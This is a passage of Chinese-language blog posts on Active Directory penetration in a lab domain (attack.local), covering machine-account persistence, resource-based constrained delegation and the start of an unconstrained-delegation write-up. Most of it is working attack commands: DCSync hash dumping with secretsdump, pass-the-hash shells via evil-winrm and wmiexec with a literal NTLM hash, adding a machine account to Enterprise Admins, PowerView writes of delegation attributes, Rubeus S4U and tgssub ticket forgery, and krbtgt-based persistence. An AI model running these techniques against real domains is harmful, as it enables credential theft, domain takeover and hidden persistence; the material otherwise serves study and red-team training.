<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181849365.png" alt="image-20220219181849365"></p>
<p>此时成功拿到域内hash</p>
<h4 id="利用impacket套件执行dcsync"><a href="#利用impacket套件执行dcsync" class="headerlink" title="利用impacket套件执行dcsync"></a>利用impacket套件执行dcsync</h4><p>使用Impacket套件中的secretsdump.py脚本，结合域内机器账户的凭证拖取域内hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:&#x27;Password@1!&#x27;@10.10.10.165 -just-dc</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217224346573.png" alt="image-20220217224346573"></p>
<p>利用其中的域管NTLM hash与域控机进行通信</p>
<h4 id="Evil-WinRM通过WinRM远程链接"><a href="#Evil-WinRM通过WinRM远程链接" class="headerlink" title="Evil-WinRM通过WinRM远程链接"></a>Evil-WinRM通过WinRM远程链接</h4><p>前提是域管开启WinRM服务，默认端口5985</p>
<p>指定域管用户以及域管用户的NTLM hash 远程链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.165 -u administrator -H dbf36575210cc5a38ab4050cc6a2e9aa</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217233828242.png" alt="image-20220217233828242"></p>
<h4 id="Impacket套件wmiexec-py远程链接"><a href="#Impacket套件wmiexec-py远程链接" class="headerlink" title="Impacket套件wmiexec.py远程链接"></a>Impacket套件wmiexec.py远程链接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wmiexec.py -hash dbf36575210cc5a38ab4050cc6a2e9aa administrator@10.10.10.165</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217234439955.png" alt="image-20220217234439955"></p>
<h3 id="加入高权限用户组用以维权"><a href="#加入高权限用户组用以维权" class="headerlink" title="加入高权限用户组用以维权"></a>加入高权限用户组用以维权</h3><p>除去域用户之外，域内机器账户也可以添加到高权限用户组中用以维权。利用Active Directory模块查询域管用户所在的用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADGroupMember &quot;administrators&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220218223834377.png" alt="image-20220218223834377"></p>
<p>使用域管权限的会话添加机器账户Nayon$到高权限用户组内。</p>
<p>可加入Enterprise Admins、Administrators、Domain Admins等高权限组内用以维权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; Nayon$ /add /domain</span><br></pre></td></tr></table></figure>

<p>利用net group查看是否被添加成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219174954928.png" alt="image-20220219174954928"></p>
<p>此时我们便可以使用Impacket中的secretsdump项目获得域内hash</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:<span class="string">&#x27;123456&#x27;</span>@10.<span class="number">10.10</span>.<span class="number">165</span> -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219182324269.png" alt="image-20220219182324269"></p>
<p>其余利用方式大同小异，在这里我便不再过多赘述了……</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>基于资源的约束委派</title>
    <url>/2022/01/30/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    <content><![CDATA[<h3 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h3><p>基于资源的约束委派，(Resource-based constrained delegation)，与前文提到的约束委派不同，它在信任的传递关系上是不同的，这也是它工作方向相反的一个因素。</p>
<p>在约束委派中，账户A到账户B的约束委派在账户A的 msDS-AllowedToDelegateTo 属性中配置，并且定义了A到B的传出<code>信任</code>,而在基于资源的约束委派当中，委派在账户B的msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了A到B的<code>传入</code>信任。</p>
<p>一图概括。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220204202427514.png" alt="image-20220204202427514"></p>
<p>如图为在Elad师傅中的文章中所得的导图，通过此图，我们可以看出基于资源的约束委派与传统约束委派的工作方式有何不同。</p>
<span id="more"></span>

<p>在基于资源的约束委派当中，我们不需要再像传统的约束委派一样，通过域管理员权限，为用户设置相关的属性以便于请求相关服务，另一点就是传统的约束委派S4U2Self返回的票据，一定要是可转发的TGS（forwardableST），如果不可转发，在S4U2Proxy阶段将会代理用户请求服务失败；但在基于资源的约束委派当中，我们无需可转发的TGS票据（TrustedToAuthenticationForDelegation），通过操作S4U2Proxy也会成功执行，返回可转发ST。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们获得用户对该主机的属性具有写权限时，那么这个用户便可以对该主机进行攻击了。</span><br></pre></td></tr></table></figure>

<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境:"></a>复现环境:</h4><ul>
<li>域:attack.local</li>
<li>域控主机:dc.attack.local，Windows Server 2012 R2 10.10.10.165</li>
<li>目标主机:oa.attack.local，Windows Server 2012 R2 10.10.10.166</li>
<li>用户: WebManager，对oa.attack.local主机具备写权限</li>
</ul>
<p>使用PowerView验证指定ACE，测试OA用户对win2016.attack.local主机是否具备写权限</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="type">Get</span>-<span class="type">DomainUser</span> -<span class="type">Identity</span> <span class="type">WebManager</span> -<span class="type">Properties</span> objectsid</span><br><span class="line"><span class="title">wmic</span>:root\cli&gt;useraccount 获得域内用户的信息</span><br><span class="line"><span class="type">Get</span>-<span class="type">DomainObjectAcl</span> -<span class="type">Identity</span> oa | ?&#123;$_.<span class="type">SecurityIdentifier</span> -match <span class="string">&quot;S-1-5-21-4052809752-717748265-227546684-1601&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205171858248.png" alt="image-20220205171858248"></p>
<p>可以看到ActiveDirectoryRights 属性为GenericWrite ，即为对oa主机具有写权限，除去GenericWrite权限可利用外，还有<code>GenericAll</code>、<code>WriteProperty</code>、<code>WriteDacl</code>权限也是可以修改账户属性进行攻击利用的。</p>
<p>拥有了可以修改计算机账户属性的帐号外，我们还需要一个SPN账户，这是因为S4U2Proxy在代替用户请求服务时，是根据Kerberos协议进行利用的，而SPN(服务主体名称)又是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。关于SPN更深层的利用在这里不再过多赘述，具体可以自行google或查看博客的<a href="https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting攻击</a>，进行学习利用。</p>
<p>在域当中，域用户默认在域内可创建的计算机账户数为10，而我们所创建的计算机账户，又默认注册在<code>RestrictedKrbHost/domain</code>、<code>HOST/domain</code>这两个SPN之下，此处我们正好可以进行利用。</p>
<p>使用Powermad注册计算机用户 win2035</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount WIN2035</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172117772.png" alt="image-20220205172117772"></p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">setspn -q <span class="comment">*/* | findstr &quot;win2035&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172024597.png" alt="image-20220205172024597"></p>
<p>通过Powermad脚本添加机器账户，查询spn发现SPN账户添加成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172000776.png" alt="image-20220205172000776"></p>
<p>查询可知机器账户WIN2035$添加成功。</p>
<p>对于<strong>修改oa计算机的msDS-AllowedToActOnBehalfOfOtherIdentity</strong>属性值,有两种方法。</p>
<h4 id="1-利用Powerview脚本修改属性值"><a href="#1-利用Powerview脚本修改属性值" class="headerlink" title="1.利用Powerview脚本修改属性值"></a>1.利用Powerview脚本修改属性值</h4><p><strong>拿到查找新注册的机器账户SID</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity WIN2035</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172307352.png" alt="image-20220205172307352"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span> <span class="comment">#此处为机器账户的sid</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> oa.attack.local| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172406926.png" alt="image-20220205172406926"></p>
<p><strong>验证是否修改成功</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer oa.attack.local -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172419960.png" alt="image-20220205172419960"></p>
<p>若msds-allowedtoactonbehalfofotheridentity存在值即为修改成功。</p>
<p><strong>清除msds-allowedtoactonbehalfofotheridentity的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject oa -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>



<h4 id="2-通过ActiveDirectory模块修改其属性值"><a href="#2-通过ActiveDirectory模块修改其属性值" class="headerlink" title="2.通过ActiveDirectory模块修改其属性值"></a>2.通过ActiveDirectory模块修改其属性值</h4><p>[^注意：ActiveDirectory仅在Windows 2012及以上版本的服务器中存在<code>-PrincipalsAllowedToDelegateToAccount</code>选项，同时，本模块默认安装于域控当中，域内机器默认并不存在，需单独安装。]: </p>
<p>若我们所打下来的域内主机不存在此模块，可通过上传dll powershell安装导入本模块进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer oa -PrincipalsAllowedToDelegateToAccount win2035$</span><br><span class="line">Get-ADComputer oa -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<p>为了让测试更加直观明确，我们先利用Mimikatz将缓存的票据擦除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kerberos::purge</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172752065.png" alt="image-20220205172752065"></p>
<p>此时的WebManager用户，无法通过手中权限访问oa的共享目录</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172826093.png" alt="image-20220205172826093"></p>
<h4 id="利用Rubeus进行攻击"><a href="#利用Rubeus进行攻击" class="headerlink" title="利用Rubeus进行攻击"></a>利用Rubeus进行攻击</h4><p>由于Rubes不支持明文密码获得基于资源的约束委派票据，所以我们需要先将其转化为hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:WIN2035 /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172856256.png" alt="image-20220205172856256"></p>
<p>然后利用WIN2035$机器账户的rc4 hash请求ST并导入当前会话。</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:cifs/oa /ptt</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035<span class="variable">$</span> /rc4:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173014453.png" alt="image-20220205173014453"></p>
<p>此时利用本会话，访问oa机器的共享目录，成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\oa\c$</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173058335.png" alt="image-20220205173058335"></p>
<h5 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\oa cmd</span><br><span class="line">Python3 getSt.py -dc-ip 10.10.10.165 -spn cifs/oa -impersonate Administrator attack.local/attack:WIN2035:123456</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205182446385.png" alt="image-20220205182446385"></p>
<h3 id="敏感账户不可被委派问题"><a href="#敏感账户不可被委派问题" class="headerlink" title="敏感账户不可被委派问题"></a>敏感账户不可被委派问题</h3><p>利用条件: 知道目标的机器账户的hash</p>
<p>[^注：一般情况下主机在加入域中会随机设置机器账户的密码，所以一般情况下用的是机器账户hash,并且我们是不可以修改机器账户的密码。]: </p>
<p>在域环境中，高权限用户如果没有特殊需求的话，考虑到安全性，一般会被设置为不可委派，或是加入受保护组。</p>
<p><strong>设置账户不可委派</strong></p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205204846994.png" alt="image-20220205204846994"></p>
<p>此时我们再利用Rubeus申请票据，却发现S4U2Self步骤成功，但在S4U2Proxy代替用户去申请ST票据时失败,错误原因显示:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[X] KRB-ERROR (13) : KDC_ERR_BADOPTION</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205205748570.png"></p>
<p>此处说明，当账户不可委派以及受保护组的成员可以完成S4U2Self，利用<code>Rubeus describe</code>查看返回的票据。</p>
<p>将制作失败的S2U4Proxy阶段票据拿出去除空格换行符后利用Rubeus与成功生成利用的票据进行对比分析。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205210850607.png" alt="image-20220205210850607"></p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205211142165.png" alt="image-20220205211142165"></p>
<p>可以发现，在<code>ServiceName</code>部分，被设置了敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为服务主机名，未被设置敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为请求的服务名。</p>
<h4 id="使用Rebeus修改票据所请求的服务名："><a href="#使用Rebeus修改票据所请求的服务名：" class="headerlink" title="使用Rebeus修改票据所请求的服务名："></a>使用Rebeus修改票据所请求的服务名：</h4><p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>

<p>利用tgssub模块替换服务名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:host/oa /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:cifs/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205213839675.png" alt="image-20220205213839675"></p>
<p>此时我们访问共享目录便具有权限了。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214033038.png" alt="image-20220205214033038"></p>
<p>获得会话shell</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214102004.png" alt="image-20220205214102004"></p>
<h4 id="利用基于资源的约束委派进行权限维持"><a href="#利用基于资源的约束委派进行权限维持" class="headerlink" title="利用基于资源的约束委派进行权限维持"></a>利用基于资源的约束委派进行权限维持</h4><p>根据基于资源的约束委派进行权限维持，主要有两种思路：</p>
<ol>
<li>配置注册的机器账户到Krbtgt基于资源的约束委派</li>
<li>配置注册的机器账户到域控基于资源的约束委派</li>
</ol>
<h5 id="机器账户到Krbtgt基于资源的约束委派"><a href="#机器账户到Krbtgt基于资源的约束委派" class="headerlink" title="机器账户到Krbtgt基于资源的约束委派"></a>机器账户到Krbtgt基于资源的约束委派</h5><p>当我们拿下域管权限后，可以利用如下命令为krbtgt用户添加ACL用于基于资源的约束委派。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainUser</span> krbtgt | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225400564.png" alt="image-20220205225400564"></p>
<p>成功修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，尝试请求票据，去除空格换行拿到Krbtgt用户的TGS票据，以便申请域内任意服务。</p>
<p>注：此处选择第三个Rubeus生成的票据进行利用，去除空格后利用Rubeus进行Hash传递，前两个生成的票据对我们即将要进行的申请服务并没有意义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u  /user:evil$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /domain:attack.local /msdsspn:krbtgt /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225930436.png" alt="image-20220205225930436"></p>
<p>利用拿到的去除空格后的TGS票据修改，获取任意服务的访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:cifs/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:host/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205233803496.png" alt="image-20220205233803496"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>非约束委派攻击</title>
    <url>/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><p><strong>委派</strong></p>
<p>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png" alt="image-20220106232045335"></p>
<h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可进行访问。</span><br></pre></td></tr></table></figure>

<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>非约束委派Kerberos中实现时，User会将自KDC拿到的TGT发送给访问的服务机器Service1,Service1再通过拿到手的TGT票据去申请访问其他域内服务，Service1在拿到用户的TGT票据后，会对其留存，以便下次备用，这时，我们便可在拿下的Service1机器中拿到域用户的TGT票据，从而访问域内的可访问服务(域管用户可访问任意服务)</p>
<span id="more"></span>

<h4 id="非约束委派流程图"><a href="#非约束委派流程图" class="headerlink" title="非约束委派流程图"></a>非约束委派流程图</h4><p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106233107179.png" alt="image-20220106233107179"></p>
<p><strong>流程</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.用户发KPB_AS_REQ消息请求[可转发TGT（forwardable TGT）] ,为了方便，先将其称之为TGT1。</span><br><span class="line"></span><br><span class="line">2.KDC在KPB_AS_REQ中返回给User TGT1。</span><br><span class="line"></span><br><span class="line">3.用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称之为TGT2）。</span><br><span class="line"></span><br><span class="line">4.在KRB_TGS_REP消息中返回Forwarded TGT 给User</span><br><span class="line"></span><br><span class="line">5.User使用TGT1向KDC申请访问service1的ST(service Ticket)</span><br><span class="line"></span><br><span class="line">6.KDC返回给用户一个ST</span><br><span class="line"></span><br><span class="line">7.User发送KRB_AP_REQ请求至service1，这个请求包括了TGT1和ST、TGT2、TGT2的sessionKey。</span><br><span class="line"></span><br><span class="line">8.service1使用用户的TGT2使用KRB_TGS_REQ发送给KDC，以用户的名义申请可以访问service2的票据.</span><br><span class="line"></span><br><span class="line">9.KDC在KRB_TGS_REP消息中返回service2到service1的票据.</span><br><span class="line"></span><br><span class="line">10.Service1以用户的名义向Service2发起KRB_AP_REQ请求.</span><br><span class="line"></span><br><span class="line">11.Service2响应步骤10中的Service1请求。</span><br><span class="line"></span><br><span class="line">12.Service1响应步骤7中用户的请求。</span><br><span class="line"></span><br><span class="line">13.在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</span><br><span class="line"></span><br><span class="line">14.KDC返回步骤13中请求的票据</span><br><span class="line"></span><br><span class="line">15.和16即为Service1通过模拟用户来访问其他Service。</span><br></pre></td></tr></table></figure>

<p><strong>下面对非约束委派进行复现利用</strong></p>
<h3 id="非约束委派配置"><a href="#非约束委派配置" class="headerlink" title="非约束委派配置"></a>非约束委派配置</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">setspn -U -A MSSQLvc/mssql.vulntarget.com:<span class="number">1433</span> win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108233836061.png" alt="image-20220108233836061"></p>
<p>当DC配置SPN给域用户Win2016时，在域内将可产生对域用户的委派，我们可以看到，域管理员勾选win2016用户的委派-信任此用户作为任何服务的委派时，将会造成非约束委派的问题。</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234035281.png" alt="image-20220108234035281"></p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109002924052.png" alt="image-20220109002924052"></p>
<h4 id="非约束委派其特征"><a href="#非约束委派其特征" class="headerlink" title="非约束委派其特征"></a>非约束委派其特征</h4><p>当域用户或机器被设置了非约束委派时，其userAccountControl属性将会包含一个名为”TRUSTED_FOR_DELEGATION”的标志。</p>
<p>我们可以在ADSI编辑器中找到</p>
